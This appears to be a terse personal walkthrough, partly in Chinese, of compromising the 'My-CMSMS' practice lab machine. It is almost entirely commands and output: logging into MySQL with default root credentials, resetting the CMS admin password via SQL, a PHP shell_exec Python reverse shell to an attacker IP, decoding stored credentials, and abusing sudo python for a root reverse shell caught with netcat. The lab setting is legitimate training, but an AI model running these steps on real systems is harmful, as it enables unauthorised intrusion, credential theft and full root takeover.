参考资料：  
[h](https://pranqsterslair.com/my-cmsms/)ttps://pranqsterslair.com/my-cmsms/
   

My-CMSMS
 
192.168.182.74
   

mysql -h 192.168.196.74 -uroot -proot --skip-ssl
    
098f6bcd4621d373cade4e832627b4f6
    
admin:password
 
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin';
    
shell
 
shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.226\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
 
python -c 'import pty; pty.spawn("/bin/bash")'
   

www-data@mycmsms:/home$ ls  
ls  
armour  
www-data@mycmsms:/home$ cd armour  
cd armour  
www-data@mycmsms:/home/armour$ ls  
ls  
binary.sh  
www-data@mycmsms:/home/armour$ cd /var/www  
cd /var/www  
www-data@mycmsms:/var/www$ ls  
ls  
html local.txt  
www-data@mycmsms:/var/www$ cat local.txt  
cat local.txt  
ef7ccd80b16f557c6f222326e4ae1ce4  
www-data@mycmsms:/var/www$
   

echo "TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=" | base64 -d
 
echo "MFZG233VOI5FG2DJMVWGIQBRGIZQ====" | base32 -d
 
armour:Shield@123
    
提权 使用python带有权限的提权
 
su: Authentication failure  
www-data@mycmsms:/var/www$ su armour  
su armour  
Password: Shield@123
 
armour@mycmsms:/var/www$ cd /tmp  
cd /tmp  
armour@mycmsms:/tmp$ ls  
ls  
armour@mycmsms:/tmp$ sudo -l  
sudo -l  
Matching Defaults entries for armour on mycmsms:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
User armour may run the following commands on mycmsms:  
(root) NOPASSWD: /usr/bin/python  
armour@mycmsms:/tmp$ sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.226",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
\<s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
\<s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   

提权内容：  
sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.226",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
\<s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   

nc -lvpn 443  
┌──(kali㉿kali)-[~/Desktop/pg02/My-CMSMS]  
└─$ nc -lvnp 443  
listening on [any] 443 ...  
connect to [192.168.45.226] from (UNKNOWN) [192.168.196.74] 55284  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root  
# ls  
proof.txt  
# cat proof.txt  
e01f523f19e767ee65941bba69cf0196  
#